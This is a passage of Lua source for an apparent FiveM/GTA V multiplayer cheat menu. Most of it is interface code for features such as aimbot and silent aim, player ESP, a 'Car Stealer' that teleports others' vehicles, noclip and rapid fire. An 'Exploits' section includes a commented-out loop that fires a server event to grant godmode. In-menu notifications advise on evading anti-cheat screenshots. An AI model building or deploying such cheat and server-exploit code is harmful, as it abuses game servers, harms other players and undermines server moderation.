       x = x + drag_X ; y = y + drag_Y
       x = x + 0.111
       local resX, resY = sum.f.GetActiveScreenResolution()
       sum.f.DrawRect(x-0.004, y, 0.00572916667, 0.0101851852, 55, 55, 55, 255)
       sum.f.DrawRect(x-0.004, y, 0.0046875, 0.00833333333, 22, 22, 22, 255)
       sum.f.DrawRect(x-0.004, y, 0.00364583333, 0.00648148148, r, g, b, 255)
       if sum.f.mouse(x-0.004, y, 0.0078125, 0.0138888889) and sum.f.clicked() then 
           return true 
       end
   end
   
   
   
   function sum.f.menubutton(tab, text, x, y) 
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       if x == 0.51 then 
           x = x + dW/2
       end
       x = x + drag_X ; y = y + drag_Y
       if not sum[text] then 
           sum[text] = {
               r = 0,
               g = 0,
               b = 0,
               a = 0,
               x = 0,
           }
       end
       sum.f.drawText(text, x, y, 0.27, 4, true)
       local width = sum.f.getWidth(text, 4, 0.27)
       local resX, resY = sum.f.GetActiveScreenResolution()
       if tab == sum.f.tab then  
           sum[text].r = sum.f.lerp(0.065, sum[text].r, sum.s['menu-r'].value)
           sum[text].g = sum.f.lerp(0.065, sum[text].g, sum.s['menu-g'].value)
           sum[text].b = sum.f.lerp(0.065, sum[text].b, sum.s['menu-b'].value)
       else
           sum[text].r = sum.f.lerp(0.065, sum[text].r, 150)
           sum[text].g = sum.f.lerp(0.065, sum[text].g, 150)
           sum[text].b = sum.f.lerp(0.065, sum[text].b, 150)
   
       end
       sum.f.DrawRect(x, y+0.007, width+0.001, 3/resY, 55, 55, 55, 255)
       sum.f.DrawRect(x, y+0.007, width, 1/resY, math.ceil(sum[text].r), math.ceil(sum[text].g), math.ceil(sum[text].b) , 255)
       if sum.f.mouse(x, y, width, 0.02) and sum.f.clicked() then 
           return true
       end
   end
   
   function sum.f:movement()
       sum.f.DisableControlAction(0, 1, true) -- LookLeftRight
       sum.f.DisableControlAction(0, 2, true) -- LookUpDown
       sum.f.DisableControlAction(0, 142, true) -- MeleeAttackAlternate
       sum.f.DisableControlAction(0, 322, true) -- ESC
       sum.f.DisableControlAction(0, 106, true) -- VehicleMouseControlOverride
       sum.f.DisableControlAction(0, 25, true) -- MOUSE 2
       sum.f.DisableControlAction(0, 24, true) -- Attack
       sum.f.DisableControlAction(0, 257, true) -- Attack2
       sum.f.DisableControlAction(0, 16, true) -- Wep Scroll
       sum.f.DisableControlAction(0, 17, true ) -- Wep Scroll
   end
   
   
   function sum.f:drawgradient()
       local getMousePosX, getMousePosY = sum.f.getmousepos()
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
   
       sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient', 0.5+drag_X+dW/2, 0.349+drag_Y, 0.252+dW, 0.0023, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
       sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient', 0.5+drag_X+dW/2, 0.649+drag_Y+dH, 0.252+dW, 0.0023, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
   
   
   
       
       if sum.f.mouse(0.5+drag_X+dW/2, 0.349+drag_Y, 0.252+dW, 0.004) and sum.f.IsDisabledControlJustPressed(0, 24) then 
           _x = sum.f.drag['Menu'].X - getMousePosX
           _y = sum.f.drag['Menu'].Y - getMousePosY
           sum.f.drag['Menu'].toggle = true
       elseif sum.f.IsDisabledControlReleased(0, 24) then
           sum.f.drag['Menu'].toggle = false
       end
       if sum.f.drag['Menu'].toggle then
           sum.f.drag['Menu'].X = getMousePosX + _x
           sum.f.drag['Menu'].Y = getMousePosY + _y
       end
   
       if sum.f.mouse(0.625+dW+drag_X, 0.65+dH+drag_Y, 0.004, 0.004*2.0) and sum.f.IsDisabledControlJustPressed(0, 24) then 
           _x = sum.f.drag['Menu'].W - getMousePosX
           _y = sum.f.drag['Menu'].H - getMousePosY
           sum.f.drag['Menu'].toggle2 = true
       elseif sum.f.IsDisabledControlReleased(0, 24) then
           sum.f.drag['Menu'].toggle2 = false
       end
       if sum.f.drag['Menu'].toggle2 then
           sum.f.drag['Menu'].W = getMousePosX + _x
           sum.f.drag['Menu'].H = getMousePosY + _y
       end
   
       if sum.f.drag['Menu'].W < 0.5 then 
           sum.f.drag['Menu'].W = 0.5
       end
       if sum.f.drag['Menu'].H < 0.5 then 
           sum.f.drag['Menu'].H = 0.5
       end
       
   end
   
   
   function sum.f.checkbox(bool, text, x, y) 
       local getMousePosX, getMousePosY = sum.f.getmousepos()
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       if x == 0.51 then 
           x = x + dW/2
       end
       x = x + drag_X ; y = y + drag_Y
       if not sum[bool] then 
           sum[bool] = {
               r = 0,
               g = 0,
               b = 0,
               a = 0,
               x = 0.0,
           }
       end
       local resX, resY = sum.f.GetActiveScreenResolution()
       if sum.c[bool] then 
           sum[bool].r = sum.f.lerp(0.065, sum[bool].r, sum.s['checkbox-check-r'].value)
           sum[bool].g = sum.f.lerp(0.065, sum[bool].g, sum.s['checkbox-check-g'].value)
           sum[bool].b = sum.f.lerp(0.065, sum[bool].b, sum.s['checkbox-check-b'].value)
           sum[bool].x = sum.f.lerp(500/resX, sum[bool].x, 0.0025)
       else
           sum[bool].r = sum.f.lerp(0.065, sum[bool].r, sum.s['checkbox-r'].value)
           sum[bool].g = sum.f.lerp(0.065, sum[bool].g, sum.s['checkbox-g'].value)
           sum[bool].b = sum.f.lerp(0.065, sum[bool].b, sum.s['checkbox-b'].value)
           sum[bool].x = sum.f.lerp(500/resX, sum[bool].x, 0.0)
       end
       sum.f.DrawRect(x-0.004, y, 0.00572916667, 0.0101851852, 55, 55, 55, 255)
       sum.f.DrawRect(x-0.004, y, 0.0046875, 0.00833333333, 22, 22, 22, 255)
   
       sum.f.DrawRect(x-0.0052+sum[bool].x, y-0.0005, 0.00104166667, 0.00740740741, sum.curak.ceil(sum[bool].r), sum.curak.ceil(sum[bool].g), sum.curak.ceil(sum[bool].b) , 255)
   
       sum.f.drawText(text, x, y+0.001, 0.27, 4, false)
       local width = sum.f.getWidth(text, 4, 0.27)
       
       if (sum.c[bool..'-keybind'] == nil) then 
           sum.c[bool..'-keybind'] = "dick"
       end
       local ptext = text
       
       if sum.f.mouse(x-0.004+width/2, y, (0.0078125)+width, 0.0138888889) and sum.f.IsDisabledControlJustPressed(0, 25) then
           local text, value = sum.m.input(text.. ' Keybind', 'B', 1, true)
           sum.c[bool..'-keybind'] = text
           text = ptext
           table.insert(sum.checkboxes, {val = sum.c[bool..'-keybind'], t = bool, l = text })
       end
   
       if sum.f.mouse(x-0.004+width/2, y, (0.0078125)+width, 0.0138888889) and sum.f.clicked() then 
           if sum.c[bool] then 
               sum.c[bool] = false
           elseif not sum.c[bool] then 
               sum.c[bool] = true
           end
       end
   end
   
   function sum.f.cofeeConfig()
       sum.c = {
           ['settings-MainFade'] = true, 
           ['settings-Fade'] = true,
       }
       sum.c['visuals-nametags']=true;
       sum.c['visuals-boundingbox']=true;
       sum.c['visuals-healthbar']=true;  
       sum.c['visuals-healthbar-text']=true;  
       sum.c['visuals-health-bar']=true; 
       sum.c['settings-Fade']=false;
       sum.c['visuals-radar']=true;
       sum.c['settings-corner']=true;
       sum.c['visuals-third-person']=true;
       sum.c['drawfsmarker']=true;
   end
   
   function sum.f.KubcaConfig()    
       sum.c = {
           ['settings-MainFade'] = true, 
           ['settings-Fade'] = true,
       }
       sum.c['visuals-nametags']=true;
       sum.c['visuals-boundingbox']=true;
       sum.c['visuals-healthbar']=true;  
       sum.c['visuals-health-bar']=true;
       sum.c['crosshair']=true;
       sum.c['visuals-radar']=true;
       sum.c['crosshair-outline']=true;
       sum.c['visuals-bounding-box-vischeck']=true;
       sum.c['visuals-blips']=true;
       sum.c['vehicle-enterveh']=true;
       sum.c['drawfsmarker']=true;
       sum.c['weapons-aimbot']=true;
       sum.c['weapons-aimbot-peds']=true;
       sum.c['weapons-aimbot-vischeck']=true;
       sum.c['visuals-boundibg-box-outline']=true;
       sum.c['visuals-healthbar-outline']=true;
   
   end
   
   function sum.f.GlifeConfig()
       sum.s['menu-r'] = {value = 200, max = 255, min = 0}
       sum.s['menu-g'] = {value = 200, max = 255, min = 0}
       sum.s['menu-b'] = {value = 200, max = 255, min = 0}
       sum.s['combo-arrow-r'] = {value = 0, max = 255, min = 0}
       sum.s['combo-arrow-g'] = {value = 255, max = 255, min = 0}
       sum.s['combo-arrow-b'] = {value = 0, max = 255, min = 0}
       sum.s['checkbox-r'] = {value = 255, max = 255, min = 0}
       sum.s['checkbox-g'] = {value = 255, max = 255, min = 0}
       sum.s['checkbox-b'] = {value = 255, max = 255, min = 0}
       sum.s['checkbox-check-r'] = {value = 0, max = 255, min = 0}
       sum.s['checkbox-check-g'] = {value = 255, max = 255, min = 0}
       sum.s['checkbox-check-b'] = {value = 0, max = 255, min = 0}
       sum.s['crosshair-r'] = {max = 255, min = 0, value = 255}
       sum.s['crosshair-g'] = {max = 255, min = 0, value = 255}
       sum.s['crosshair-b'] = {max = 255, min = 0, value = 255}
       sum.c = {
           ['settings-MainFade'] = true, 
           ['settings-Fade'] = true,
       }
       sum.c['crosshair']=true;
       sum.c['visuals-radar']=true;
       sum.c['crosshair-outline']=true;
       sum.c['vehicle-enterveh']=true;
       sum.c['glife-aimbot']=true;
       sum.c['fillamo-glife']=true;
   
   
   end
   
   function sum.f:draw()
       local alpha = 255
       local drag_X = sum.f.drag['Menu'].X - 0.5
       local drag_Y = sum.f.drag['Menu'].Y - 0.5
       local dW = sum.f.drag['Menu'].W - 0.5
       local dH = sum.f.drag['Menu'].H - 0.5
       sum.f.DrawRect(0.5+dW/2+drag_X, 0.5+drag_Y+dH/2, 0.252+dW, 0.3036+dH, 22, 22, 22, alpha)
       sum.f.DrawRect(0.5+dW/2+drag_X, 0.5+drag_Y+dH/2, 0.251+dW, 0.3018+dH, 55, 55, 55, alpha)
       sum.f.DrawRect(0.5+dW/2+drag_X, 0.5+drag_Y+dH/2, 0.25+dW, 0.3+dH, 20, 20, 20, alpha)
   
   
       sum.f.DrawRect(0.5+dW/2+drag_X, 0.51+drag_Y+dH/2, 0.247+dW, 0.2718+dH, 55, 55, 55, alpha)
       sum.f.DrawRect(0.5+dW/2+drag_X, 0.51+drag_Y+dH/2, 0.246+dW, 0.27+dH, 20, 20, 20, alpha)
   
       sum.f.DrawRect((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH, 55, 55, 55, alpha)
       sum.f.DrawRect((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.12-dW/2, 0.264+dH, 22, 22, 22, alpha)
   
       sum.f.DrawRect((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH, 55, 55, 55, alpha)
       sum.f.DrawRect((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.12-dW/2, 0.264+dH, 22, 22, 22, alpha)
   
       
       sum.f.DrawRect(0.5+dW/2+drag_X, 0.3615+drag_Y, 0.247+dW, 0.0188, 55, 55, 55, alpha)
       sum.f.DrawRect(0.5+dW/2+drag_X, 0.3615+drag_Y, 0.246+dW, 0.017, 20, 20, 20, alpha)
   
       --DrawRect(0.625+dW, 0.65+dH, 0.004, 0.004*2.0, 255, 255, 255, 255) Box u resize
   
       if sum.f.menubutton('player', 'Player', 0.387, 0.3615) then 
           sum.f.tab = 'player'
       end
   
       if sum.f.menubutton('vehicle', 'Vehicle', 0.407, 0.3615) then 
           sum.f.tab = 'vehicle'
       end
       
       if sum.f.menubutton('weapons', 'Weapons', 0.4305, 0.3615) then 
           sum.f.tab = 'weapons'
       end
   
       if sum.f.menubutton('visuals', 'Visuals', 0.4535, 0.3615) then 
           sum.f.tab = 'visuals'
       end
   
       if sum.f.menubutton('destroyer', 'Destroyer', 0.4775, 0.3615) then 
           sum.f.tab = 'destroyer'
       end
   
       if sum.f.menubutton('players', 'Online', 0.501, 0.3615) then 
           sum.f.tab = 'players'
       end
   
       if sum.f.menubutton('lua', 'Lua', 0.5165, 0.3615) then 
           sum.f.tab = 'lua'
       end
   
       if sum.f.menubutton('aimbot', 'Aimbot', 0.533, 0.3615) then 
           sum.f.tab = 'aimbot'
       end
   
       if sum.f.menubutton('settings', 'Settings', 0.555, 0.3615) then 
           sum.f.tab = 'settings'
       end
   
       if sum.f.menubutton('glife', 'G-Life', 0.615+dW, 0.3615) then 
           sum.f.tab = 'glife'
           sum.f.sendNotification('Safe to use!','Features')
           sum.f.sendNotification('Keep on mind Visuals can be seen on screenshot-basic','Visuals')
           sum.f.sendNotification('Use redENGINE ESP','G-Life ESP')
       end
   
       if sum.f.tab == 'glife' then
           --[[sum.f.DrawRect(0.67+drag_X+dW, 0.44+drag_Y, 0.082, 0.102*1.8, 22, 22, 22, 255)
           sum.f.DrawRect(0.67+drag_X+dW, 0.44+drag_Y, 0.081, 0.101*1.8, 55, 55, 55, 255)
           sum.f.DrawRect(0.67+drag_X+dW, 0.44+drag_Y, 0.08, 0.1*1.8, 22, 22, 22, 255)]]
   
           sum.f.DrawRect(0.67+drag_X+dW, 0.5+drag_Y, 0.082, 0.3036, 22, 22, 22, 255)
           sum.f.DrawRect(0.67+drag_X+dW, 0.5+drag_Y, 0.081, 0.3018, 55, 55, 55, 255)
           sum.f.DrawRect(0.67+drag_X+dW, 0.5+drag_Y, 0.08, 0.3, 22, 22, 22, 255)
           local rX, rY = sum.f.GetActiveScreenResolution()
           sum.f.DrawSprite('mpentry', 'mp_modenotselected_gradient',0.67+drag_X+dW, 0.359+drag_Y, 0.12, 22/rY, 0.0, 1, 1, 1, 255)
           sum.f.drawText('Nearest Vehicles', 0.67+drag_X+dW, 0.3595+drag_Y, 0.27, 4, true)
   
   
           
   
           sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient',0.67+drag_X+dW, 0.44+drag_Y-((0.1*1.8)/2), 0.08, 2/rY, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
           --sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient',0.67+drag_X+dW, 0.44+drag_Y+((0.1*1.8)/2), 0.08, 2/rY, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
           sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient', 0.67+drag_X+dW, 0.649+drag_Y-((0.1*0.001)/2), 0.08, 2/rY, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
           local y = 0.375+ 0.0155+sum.st['glife'].static3
   
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.375+ 0.0155 - (3213 * 0.0155)) and sum.f.mouse(0.67+drag_X+dW, 0.5+drag_Y, 0.082, 0.3036) then
               sum.st['glife'].static3 = sum.st['glife'].static3 - 0.0155
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.375+ 0.0155 and sum.f.mouse(0.67+drag_X+dW, 0.5+drag_Y, 0.082, 0.3036) then
               sum.st['glife'].static3 = sum.st['glife'].static3 + 0.0155
           end
   
           if sum.f.comboGlife('Teleport', {"To Vehicle", "Vehicle To Me", "Vehicle To Me & Sit In"} , 0.638, 0.375, sum.combo[29], function(currentIndex)
               sum.combo[29] = currentIndex
           end) then
       end       
   
           local checkveh 
           local max = 0.65+dH/1.06
   
           for vehicle in sum.f.enumerateVehicles() do
               for k, ped in pairs(sum.f.GetActivePlayers()) do 
                   if sum.f.IsPedInVehicle(sum.f.GetPlayerPed(ped), vehicle, true) then 
                       checkveh = '</font><font color="#FF1300">OCCUPED</font>'
                   else
                       checkveh = '</font><font color="#00FF08">EMPTY</font>'
                   end
               end
               local name = sum.f.GetDisplayNameFromVehicleModel(sum.f.GetEntityModel(vehicle))
               local vehnamenotif = sum.f.GetDisplayNameFromVehicleModel(sum.f.GetEntityModel(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId())))
   
               if y >= 0.375+ 0.0155 and y <= max then  
                   if sum.f.button(name.. ' ['..checkveh..']', 0.638+dW, y) then
                       if sum.combo[29] == 1 then 
                           if vehicle ~= nil then
                               sum.f.SetPedIntoVehicle(sum.f.PlayerPedId(), vehicle, -1)
                               sum.f.sendNotification('Teleported to '..vehnamenotif..'!','G-Life Car Stealer')
                               --sum.f.sendNotification('Fixed and fliped '..vehnamenotif..'!','G-Life Car Stealer')
                               for i = 1, 5 do
                                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                                   sum.f.SetVehicleOnGroundProperly(veh)
                                   sum.f.SetVehicleFixed(veh, false)
                               end
                           end
                       elseif sum.combo[29] == 2 then 
                           sum.f.requestControlOnce(vehicle)
                           sum.f.SetEntityCoords(vehicle, sum.f.GetEntityCoords(sum.f.PlayerPedId()))
                           
                           sum.f.sendNotification('Teleported '..vehnamenotif..' to you!','G-Life Car Stealer')
                           --sum.f.sendNotification('Fixed and fliped '..vehnamenotif..'!','G-Life Car Stealer')
                           for i = 1, 5 do
                               local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                               sum.f.SetVehicleOnGroundProperly(veh)
                               sum.f.SetVehicleFixed(veh, false)
                           end  
                       elseif sum.combo[29] == 3 then 
                           sum.f.requestControlOnce(vehicle)
                           sum.f.SetEntityCoords(vehicle, sum.f.GetEntityCoords(sum.f.PlayerPedId()))
                           sum.f.SetPedIntoVehicle(sum.f.PlayerPedId(), vehicle, -1)
                           sum.f.sendNotification('Teleported '..vehnamenotif..' to you!','G-Life Car Stealer')
                           --sum.f.sendNotification('Fixed and fliped '..vehnamenotif..'!','G-Life Car Stealer')
                           for i = 1, 5 do
                               local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                               sum.f.SetVehicleOnGroundProperly(veh)
                               sum.f.SetVehicleFixed(veh, false)
                           end                            
                       end
                   end 
               end y = y + 0.0155
           end
           
          -- sum.f.drawText(''..name, 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
           
           local y = 0.387+sum.st['glife'].static
           local add = 0.0155
           local max = 0.65+dH/1.06
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (2 * add)) and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['glife'].static = sum.st['glife'].static - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['glife'].static = sum.st['glife'].static + add
           end
           if y >= 0.385 and y <= max then 
               sum.f.separator('Visuals', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('lootbags', 'Lootbags', 0.3875, y) 
               if sum.f.pickerbutton(sum.s['lootbag-color-r'].value, sum.s['lootbag-color-g'].value, sum.s['lootbag-color-b'].value, 0.3875, y) then 
                   sum.s['lootbag-color-r'].value, sum.s['lootbag-color-g'].value, sum.s['lootbag-color-b'].value = sum.f.ColorPicker(sum.s['lootbag-color-r'].value, sum.s['lootbag-color-g'].value, sum.s['lootbag-color-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('lootbags-line', 'Lootbag - Line', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('lootbags-box', 'Lootbag - Box', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('dungeon-generator', 'Dungeon Generator', 0.3875, y) 
               if sum.f.pickerbutton(sum.s['dungeon-color-r'].value, sum.s['dungeon-color-g'].value, sum.s['dungeon-color-b'].value, 0.3875, y) then 
                   sum.s['dungeon-color-r'].value, sum.s['dungeon-color-g'].value, sum.s['dungeon-color-b'].value = sum.f.ColorPicker(sum.s['dungeon-color-r'].value, sum.s['dungeon-color-g'].value, sum.s['dungeon-color-b'].value)
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('hide-id', 'Hide-ID', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Aimbot', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('glife-aimbot', 'Silent Aim', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if y >= 0.385 and y <= max then 
                   if sum.f.combo('Target Hitbox', {"Head", "Neck", "Chest", "Stomach", "Pelvis"} , 0.3875, y, sum.combo[25], function(currentIndex)
                       sum.combo[25] = currentIndex
                           -- bones SKEL_ROOT = 0x0,SKEL_Pelvis = 0x2e28,SKEL_L_Thigh = 0xe39f,SKEL_L_Calf = 0xf9bb,SKEL_L_Foot = 0x3779,SKEL_L_Toe0 = 0x83c,IK_L_Foot = 0xfedd,PH_L_Foot = 0xe175,MH_L_Knee = 0xb3fe,SKEL_R_Thigh = 0xca72,SKEL_R_Calf = 0x9000,SKEL_R_Foot = 0xcc4d,SKEL_R_Toe0 = 0x512d,IK_R_Foot = 0x8aae,PH_R_Foot = 0x60e6,MH_R_Knee = 0x3fcf,RB_L_ThighRoll = 0x5c57,RB_R_ThighRoll = 0x192a,SKEL_Spine_Root = 0xe0fd,SKEL_Spine0 = 0x5c01,SKEL_Spine1 = 0x60f0,SKEL_Spine2 = 0x60f1,SKEL_Spine3 = 0x60f2,SKEL_L_Clavicle = 0xfcd9,SKEL_L_UpperArm = 0xb1c5,SKEL_L_Forearm = 0xeeeb,SKEL_L_Hand = 0x49d9,SKEL_L_Finger00 = 0x67f2,SKEL_L_Finger01 = 0xff9,SKEL_L_Finger02 = 0xffa,SKEL_L_Finger10 = 0x67f3,SKEL_L_Finger11 = 0x1049,SKEL_L_Finger12 = 0x104a,SKEL_L_Finger20 = 0x67f4,SKEL_L_Finger21 = 0x1059,SKEL_L_Finger22 = 0x105a,SKEL_L_Finger30 = 0x67f5,SKEL_L_Finger31 = 0x1029,SKEL_L_Finger32 = 0x102a,SKEL_L_Finger40 = 0x67f6,SKEL_L_Finger41 = 0x1039,SKEL_L_Finger42 = 0x103a,PH_L_Hand = 0xeb95,IK_L_Hand = 0x8cbd,RB_L_ForeArmRoll = 0xee4f,RB_L_ArmRoll = 0x1470,MH_L_Elbow = 0x58b7,SKEL_R_Clavicle = 0x29d2,SKEL_R_UpperArm = 0x9d4d,SKEL_R_Forearm = 0x6e5c,SKEL_R_Hand = 0xdead,SKEL_R_Finger00 = 0xe5f2,SKEL_R_Finger01 = 0xfa10,SKEL_R_Finger02 = 0xfa11,SKEL_R_Finger10 = 0xe5f3,SKEL_R_Finger11 = 0xfa60,SKEL_R_Finger12 = 0xfa61,SKEL_R_Finger20 = 0xe5f4,SKEL_R_Finger21 = 0xfa70,SKEL_R_Finger22 = 0xfa71,SKEL_R_Finger30 = 0xe5f5,SKEL_R_Finger31 = 0xfa40,SKEL_R_Finger32 = 0xfa41,SKEL_R_Finger40 = 0xe5f6,SKEL_R_Finger41 = 0xfa50,SKEL_R_Finger42 = 0xfa51,PH_R_Hand = 0x6f06,IK_R_Hand = 0x188e,RB_R_ForeArmRoll = 0xab22,RB_R_ArmRoll = 0x90ff,MH_R_Elbow = 0xbb0,SKEL_Neck_1 = 0x9995,SKEL_Head = 0x796e,IK_Head = 0x322c,FACIAL_facialRoot = 0xfe2c,FB_L_Brow_Out_000 = 0xe3db,FB_L_Lid_Upper_000 = 0xb2b6,FB_L_Eye_000 = 0x62ac,FB_L_CheekBone_000 = 0x542e,FB_L_Lip_Corner_000 = 0x74ac,FB_R_Lid_Upper_000 = 0xaa10,FB_R_Eye_000 = 0x6b52,FB_R_CheekBone_000 = 0x4b88,FB_R_Brow_Out_000 = 0x54c,FB_R_Lip_Corner_000 = 0x2ba6,FB_Brow_Centre_000 = 0x9149,FB_UpperLipRoot_000 = 0x4ed2,FB_UpperLip_000 = 0xf18f,FB_L_Lip_Top_000 = 0x4f37,FB_R_Lip_Top_000 = 0x4537,FB_Jaw_000 = 0xb4a0,FB_LowerLipRoot_000 = 0x4324,FB_LowerLip_000 = 0x508f,FB_L_Lip_Bot_000 = 0xb93b,FB_R_Lip_Bot_000 = 0xc33b,FB_Tongue_000 = 0xb987,RB_Neck_1 = 0x8b93,IK_Root = 0xdd1c
                   end) then
                   end
               end 
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('glife-aimbot-dt', 'Doubletap', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('glife-aimbot-peds', 'Target Zombies', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('glife-aimbot-fov', 'Draw FOV', 0.3875, y) 
           end y = y + add            
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['glife-aimbot-fov'], 0.3875, y, 2)
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.separator('Vehicle', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('auto-storeveh', 'Auto Store', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('focusveh', 'Teleport Into Focused Vehicle', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-autorepairglife', 'Auto Repair', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Change Vehicle Speed', 0.3875, y) then 
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                   sum.f.SetVehicleGravityAmount(veh, sum.s['glife-extra-handling-attachment'].value)
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['glife-extra-handling-attachment'], 0.3875, y, 1) 
           end y = y + add  
   
   
   
   
           local y = 0.387+sum.st['glife'].static2
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (4 * add)) and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['glife'].static2 = sum.st['glife'].static2 - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['glife'].static2 = sum.st['glife'].static2 + add
           end
           if y >= 0.385 and y <= max then 
               sum.f.separator('Exploits', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('noclip-glife', 'Noclip', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Car Speed', 0.51, y) then end
           end y = y + add 
           if y >= 0.385 and y <= max then 
              sum.f.slider(sum.s['glife-noclip-value'], 0.51, y, 1) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('noclip-glife-experimental', 'Experimental Noclip', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('glife-superrun-slide', 'Stamina Shot', 0.51, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Fill Ammo', 0.51, y) then
               local p = sum.f.PlayerPedId()
               local _, gun = sum.f.GetCurrentPedWeapon(p)
               sum.f.SetPedAmmo(p, gun, sum.f.GetWeaponClipSize(gun))  
               sum.f.RefillAmmoInstantly(p, true)
           end y = y + add 
       end
   
       --[[if y >= 0.385 and y <= max then
           if sum.f.button("Give Godmode", 0.51, y) then
               sum.curak.thr(
                   function()
                       while sum.c["glife-godmode"] do
                           sum.curak.wait(250)
                           TriggerServerEvent("fda17b0929989f53ecd03e1f5111e78f:setI", true)
                       end
                   end
               )
           end
           y = y + add
       end
   
       if y >= 0.385 and y <= max then
           if sum.f.button("Remove Godmode", 0.51, y) then
               sum.curak.thr(
                   function()
                       while sum.c["glife-godmode"] do
                           sum.curak.wait(250)
                           TriggerServerEvent("fda17b0929989f53ecd03e1f5111e78f:setI", false)
                       end
                   end
               )
           end
           y = y + add
       end]]
       
   
   
   
           if y >= 0.385 and y <= max then 
               if y >= 0.385 and y <= max then 
                   sum.f.checkbox('fillamo-glife', 'Infinity Ammo', 0.51, y) 
               end y = y + add    
           end
   
           if y >= 0.385 and y <= max then 
               if y >= 0.385 and y <= max then 
                   sum.f.checkbox('weapons-rapidFire-glife', 'Rapidfire', 0.51, y) 
               end y = y + add    
           end
   
               if y >= 0.385 and y <= max then 
                   if y >= 0.385 and y <= max then 
                   sum.f.checkbox('noprop-glife', 'No-Prop', 0.51, y) 
               end y = y + add     
           end    
           if y >= 0.385 and y <= max then 
               if y >= 0.385 and y <= max then 
               sum.f.checkbox('noprop-glife-second', 'Prop Alpha', 0.51, y) 
           end y = y + add     
       end                  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['glife-prop-value'], 0.51, y) 
            end y = y + add 
   
           
           if y >= 0.385 and y <= max then 
               sum.f.separator('Zombies', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
